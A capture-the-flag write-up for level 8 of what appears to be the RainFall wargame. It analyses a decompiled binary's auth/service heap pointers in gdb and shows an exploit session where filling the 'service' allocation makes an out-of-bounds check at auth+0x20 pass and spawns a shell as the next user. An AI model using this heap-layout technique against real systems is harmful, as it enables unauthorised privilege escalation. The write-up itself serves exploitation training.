<h1 align="center"> LEVEL 8 </h1>

## 🔍 Analysis of Decompiled [level8](./source.c)
The program keeps two global pointers:
- (gdb) info address :
  - `auth` :  auth is at `0x8049aac` → initially NULL.
  - `service` : info address service is at : `0x8049ab0` → initially NULL.
  - p `0x8049ab0` - `0x8049aac` = 4

It accepts four commands:

- **auth \<str\>**
  - Allocates 4 bytes for `auth` at `0x804a008`
  - Uses `strcpy` into that buffer.
- **reset**
  - Frees `auth`
- **service \<str\>**
  - `service = strdup(buffer)`
- **login**
  - If `*(int*)(auth + 0x20) != 0` → calls `system("/bin/sh")`
  - Else prints `"Password:"`

⚠️ Vulnerability: auth only points to 4 bytes, but the program reads from auth+0x20. That lands outside its allocation and overlaps with the nextheap chunk.
```
(gdb) p/x auth
$1 = 0x804a008
(gdb) p/x service
$2 = 0x804a018
(gdb) p/x auth+0x20
$3 = 0x804a028
(gdb) p 0x804a028 - 0x804a018
$3 = 16

```

## 💥 Exploit

The program reading 4 bytes from auth+0x20 without bounds checking. With heap layout manipulation, that address overlaps service, producing a non-zero at `auth + 0x20` and giving us a shell.
```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service0123456789abcdef
0x804a008, 0x804a018 
login
$ whoami
level9
```



